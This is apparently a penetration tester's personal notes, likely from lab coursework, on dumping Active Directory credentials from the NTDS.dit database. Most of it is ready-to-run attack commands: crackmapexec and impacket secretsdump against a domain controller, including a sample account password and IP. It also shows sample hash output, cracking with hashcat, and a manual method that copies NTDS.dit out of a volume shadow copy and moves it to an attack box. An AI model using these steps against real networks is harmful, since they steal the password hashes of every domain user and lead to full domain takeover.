-- -
The `NDTS.dit` file is the AD database file that holds the data for Users, Groups, Security descriptors, and password hashes for all the users in the domain. Keys of the kingdom, you own this you own the domain.
#### netexec
Should dump hashes to the terminal
```bash
crackmapexec smb <dc ip> -u <user> -p <passwd> --ntds
```
Take the NT hash, then crack:
```bash
hashcat -m 1000 <hashfile> <wordlist>
```
#### Secretsdump
```bash
# secretsdump.py or impacket-secretsdump, it's the same command
secretsdump.py <domain>/<da user>:'<da password>'@<dc ip> -just-dc-ntlm
secretsdump.py MARVEL.local/pparker:'Password2'@192.168.138.132 -just-dc-ntlm
``` 

Should spit out something like:
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
```

Take out the NT hash, which is the last hash after colon:
```
920ae267e048417fcfe00f49ecbd4b33
```
Then Crack:
```bash
hashcat -m 1000 <hashfile> <wordlist>
```
#### Manual
```powershell
# make a backup of C:\ Drive
vssadmin CREATE SHADOW /For=C:

# above command will show the path to the copy, for example:
# \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2

# make a copy of the NTDS.dit file from the backup you just created
# plug in the path output above
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Then [[Dark Arts I/File Transfer/~Home|File transfer]] to attack box for cracking